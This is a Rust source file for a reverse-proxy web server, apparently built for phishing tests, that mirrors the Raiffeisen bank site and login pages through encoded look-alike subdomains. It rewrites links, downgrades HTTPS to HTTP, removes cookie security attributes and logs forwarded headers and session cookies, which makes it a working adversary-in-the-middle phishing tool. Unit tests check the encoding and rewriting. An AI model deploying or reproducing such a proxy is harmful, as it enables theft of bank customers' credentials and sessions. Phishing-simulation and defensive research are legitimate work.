use axum::Router;
use axum::extract::Path;
use axum::http::{HeaderMap, Method, StatusCode};
use axum::response::IntoResponse;
use axum::routing::{delete, get, post, put};
use base64::Engine;
use base64::engine::general_purpose::STANDARD_NO_PAD;
use bytes::Bytes;
use regex::{Captures, Regex, Replacer};
use reqwest::ClientBuilder;
use reqwest::redirect::Policy;
use std::collections::HashMap;
use std::string::ToString;

async fn get_root(path: Option<Path<String>>, method: Method, mut request_header: HeaderMap) -> impl IntoResponse {
    let domain = "local-dev.phishtest.cloud:53001";

    let mut headers = HeaderMap::new();
    headers.insert(
        "Content-Security-Policy",
        format!("default-src 'self' http://*.{domain}/; style-src 'self' http://*.{domain}/ 'unsafe-inline'; script-src 'self' http://*.{domain}/ 'unsafe-inline'")
            .parse()
            .unwrap(),
    );
    headers.insert("Referrer-Policy", "same-origin".parse().unwrap());

    let path = path.map(|i| i.0).unwrap_or_else(|| "".to_string());

    // println!("Start domain: {}", STANDARD_NO_PAD.encode("www.raiffeisen.ch"));

    let host: &str = request_header.get("Host").unwrap().to_str().unwrap();
    let subdomain = host.split(".").next().unwrap();
    // println!("Host: {}->{}", host, subdomain);

    let data =
        base32::decode(base32::Alphabet::Rfc4648Lower { padding: false }, subdomain).unwrap();
    let subdomain = String::from_utf8(data).unwrap();

    // println!("Host: {}->{}", host, subdomain);

    if path.contains("rfdwdc/") || path.contains("fcs2/") {
        return (StatusCode::NOT_FOUND, headers, Bytes::new());
    }
    if path.contains("unsupported-browser/") {
        return (StatusCode::NOT_FOUND, headers, Bytes::new());
    }

    request_header.remove("host");
    request_header.remove("origin");
    request_header.remove("referer");
    request_header.remove("accept-encoding");
    println!("Headers: {:?}", request_header);

    let client = ClientBuilder::new()
        .redirect(Policy::none())
        .build()
        .unwrap();
    let res = client
        .request(method,format!("https://{subdomain}/{path}"))
        .headers(request_header)
        .send()
        .await
        .unwrap();

    println!("Url: {}", res.url());

    let status_code = res.status();
    match(status_code){
        StatusCode::MOVED_PERMANENTLY => {
            let location = res.headers().get("location").unwrap().to_str().unwrap();
            let target = translate_domains(location.to_string(), domain, true);
            headers.insert("Location", target.parse().unwrap());

            return (StatusCode::MOVED_PERMANENTLY, headers, Bytes::new());
        },
        _=> {}
    }
    if let Some(content_type) = res.headers().get("Content-Type") {
        headers.insert("Content-Type", content_type.clone());
    }
    // for cookie in res.cookies() {
    //     println!("Cookie: {:?}", cookie);
    // }

    for cookie in res.headers().get_all("Set-Cookie"){
        //TODO filter
        let c = clean_cookie(cookie.to_str().unwrap());
        println!("Cookie: {:?}", c);
        headers.insert("Set-Cookie", c.parse().unwrap());
    }
    let mut content = res.bytes().await.unwrap();

    if let Ok(string_content) = String::from_utf8(content.to_vec()) {
        // if !path.ends_with(".js") {
        // println!("translate content: {path}");
        content = Bytes::from(translate_domains(string_content, domain, true));
        // }
    }

    // builder.body(content).unwrap()
    // (headers, )
    (status_code, headers, content)
}

#[tokio::main]
async fn main() {
    // Convert the proxy to a router and use it in your Axum application
    let app: Router = Router::new()
        .route("/", get(get_root))
        .route("/{*path}", get(get_root))
        .route("/{*path}", delete(get_root))
        .route("/{*path}", post(get_root))
        .route("/{*path}", put(get_root))
        ;

    let listener = tokio::net::TcpListener::bind("0.0.0.0:53001")
        .await
        .unwrap();
    axum::serve(listener, app).await.unwrap();
}

struct NameSwapper<'a> {
    target_domain: &'a str,
    downgrade: bool,
}

impl<'a> Replacer for NameSwapper<'a> {
    fn replace_append(&mut self, caps: &Captures<'_>, dst: &mut String) {
        if let Some(scheme) = caps.get(1) {
            if !scheme.as_str().starts_with("http") {
                dst.push_str(&caps[0]);
                return;
            }

            if self.downgrade {
                dst.push_str("http:");
            } else {
                dst.push_str(&scheme.as_str());
            }
        }
        dst.push_str("//");
        dst.push_str(&encode_domain(&caps[2]));
        dst.push_str(".");
        dst.push_str(self.target_domain);
        if caps.get(3).is_some() {
            dst.push_str("/");
        }
    }
}

fn translate_domains(input: String, domain: &str, downgrade: bool) -> String {
    let pattern = Regex::new(r"(?<scheme>\w+:)?//([\w.-]+)(/)?").unwrap();

    pattern
        .replace_all(
            input.as_str(),
            NameSwapper {
                target_domain: domain,
                downgrade,
            },
        )
        .to_string()
}

fn encode_domain(domain: &str) -> String {
    let alphabet = base32::Alphabet::Rfc4648Lower { padding: false };
    base32::encode(alphabet, domain.as_bytes())
}

fn clean_cookie(cookie: &str) -> String {
    let pattern = Regex::new(r"Domain=.*?;").unwrap();

    pattern.replace_all(cookie, "");
    let res = cookie.replace("Secure;", "");
    let res = pattern.replace(&res, "").to_string();
    res
}

#[cfg(test)]
mod tests {
    use crate::{clean_cookie, encode_domain, translate_domains};

    #[test]
    fn test_encoding() {
        let alphabet = base32::Alphabet::Rfc4648Lower { padding: false };

        let input = encode_domain("www.raiffeisen.ch");
        assert_eq!("o53xoltsmfuwmztfnfzwk3romnua", input);

        let data = base32::decode(alphabet, input.as_str()).unwrap();
        assert_eq!("www.raiffeisen.ch", String::from_utf8(data).unwrap());

        let input = encode_domain("login.raiffeisen.ch");
        assert_eq!("nrxwo2lofzzgc2lgmzsws43fnyxgg2a", input);
    }
    
    #[test]
    fn test_cookie(){
        let input = "lang=de; Path=/; Secure; Domain=.raiffeisen.ch; Expires=Thu, 20 May 2027 23:56:19 GMT; SameSite=Lax";
        assert_eq!("lang=de; Path=/;   Expires=Thu, 20 May 2027 23:56:19 GMT; SameSite=Lax", clean_cookie(input));
    }

    #[test]
    fn test_content_rewrite() {
        let input = "hreflang=\"it-CH\" href=\"https://login.raiffeisen.ch/it\"/>";

        let output = translate_domains(input.to_string(), "domain.local", false);
        assert_eq!(
            "hreflang=\"it-CH\" href=\"https://nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>",
            output
        );

        let output = translate_domains(input.to_string(), "domain.local", true);
        assert_eq!(
            "hreflang=\"it-CH\" href=\"http://nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>",
            output
        );

        let output = translate_domains(
            "hreflang=\"it-CH\" href=\"//login.raiffeisen.ch/it\"/>".to_string(),
            "domain.local",
            true,
        );
        assert_eq!(
            "hreflang=\"it-CH\" href=\"//nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>",
            output
        );

        let output = translate_domains(
            "hreflang=\"it-CH\" href=\"//login.raiffeisen.ch\"/>".to_string(),
            "domain.local",
            true,
        );
        assert_eq!(
            "hreflang=\"it-CH\" href=\"//nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local\"/>",
            output
        );

        let output = translate_domains(
            "hreflang=\"it-CH\" href=\"webpack://login.raiffeisen.ch/it\"/>".to_string(),
            "domain.local",
            true,
        );
        assert_eq!(
            "hreflang=\"it-CH\" href=\"webpack://login.raiffeisen.ch/it\"/>",
            output
        );

        // let output = translate_domains(
        //     "amai?\"https://fast.\":\"https://\"),t=r+this.subdoma".to_string(),
        //     "domain.local",
        //     true,
        // );
        // assert_eq!(
        //     "amai?\"https://fast.\":\"https://\"),t=r+this.subdoma",
        //     output
        // );
    }
}
